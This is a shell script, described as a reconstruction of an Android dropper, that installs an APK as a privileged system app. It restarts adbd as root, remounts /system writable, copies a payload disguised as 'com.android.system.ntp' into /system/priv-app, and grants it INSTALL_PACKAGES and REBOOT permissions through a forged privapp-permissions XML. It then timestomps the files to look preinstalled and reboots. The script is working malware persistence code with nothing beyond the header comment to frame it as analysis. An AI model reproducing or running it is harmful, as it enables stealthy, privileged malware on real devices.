#!/bin/sh
# Reconstruction of the post-2026 XCPE dropper evolution: restart adbd as
# root, remount the system partition read-write, replicate the payload into
# /system/priv-app/, mint a privapp-permissions XML granting privileged
# permissions, then timestomp and reboot into the privileged install.
APP=com.android.system.ntp
SRC=/data/app/${APP}/base.apk
DEST=/system/priv-app/${APP}

# Restart the local adbd service as root and open an ADB shell connection.
setprop service.adb.root 1
setprop ctl.restart adbd
sleep 2
adb root
adb shell id

# Remount the read-only system partition writable and self-install there.
mount -o rw,remount /system
mkdir -p "${DEST}"
cp "${SRC}" "${DEST}/${APP}.apk"
chmod 644 "${DEST}/${APP}.apk"

cat > "/system/etc/permissions/privapp-permissions-${APP}.xml" <<EOF
<?xml version="1.0" encoding="utf-8"?>
<permissions>
    <privapp-permissions package="${APP}">
        <permission name="android.permission.INSTALL_PACKAGES"/>
        <permission name="android.permission.REBOOT"/>
    </privapp-permissions>
</permissions>
EOF
chmod 644 "/system/etc/permissions/privapp-permissions-${APP}.xml"

# Timestomp the new system copy to blend in with preinstalled packages.
INSTALL_TIME=$(getprop persist.networkstack.install_time)
touch -t "${INSTALL_TIME:-202401010000.00}" "${DEST}/${APP}.apk" "/system/etc/permissions/privapp-permissions-${APP}.xml"

mount -o ro,remount /system
if [ "$(getprop persist.networkstack.uninstall)" = "1" ]; then
    pm uninstall "${APP}"
    exit 0
fi
reboot
